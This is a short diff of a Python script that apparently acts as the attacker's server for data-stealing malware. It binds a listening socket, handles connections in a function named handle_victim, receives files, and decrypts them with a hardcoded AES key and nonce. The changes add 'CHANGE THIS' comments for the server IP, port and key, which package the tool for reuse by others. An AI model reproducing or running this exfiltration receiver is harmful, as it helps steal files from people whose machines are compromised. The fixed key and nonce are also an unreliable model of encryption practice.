@@ -6,8 +6,8 @@ from Crypto.Cipher import AES
 
 
 def get_data_from_cipher(cipher):
-    key = b"SymmetricKeyMike"
-    nonce = b"SymmetricKeyNce"
+    key = b"SymmetricKeyMike" # choose your own encryption key 16 chars long (if you wish)
+    nonce = b"SymmetricKeyNce" # choose your own nonce 16 chars long (if you wish)
     data = AES.new(key, AES.MODE_EAX, nonce)
     return data.decrypt(cipher)
 
@@ -22,7 +22,6 @@ def download_file(file_name, sock: socket.socket):
             except TimeoutError:
                 break
             result += content
-            # print("content line: ", content)
             if len(content) == 0 or not content:
                 break
         file.write(get_data_from_cipher(result))
@@ -54,8 +53,11 @@ def handle_victim(communication_sock: socket.socket, ip):
 
 listening_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
-ip = "192.168.63.218"
-port = 4045
+######
+ip = "192.168.63.218" # CHANGE THIS (SERVER IP)
+port = 4045 # CHANGE THIS (SERVER PORT)
+######
+
 listening_sock.bind((ip, port))
 
 listening_sock.listen()
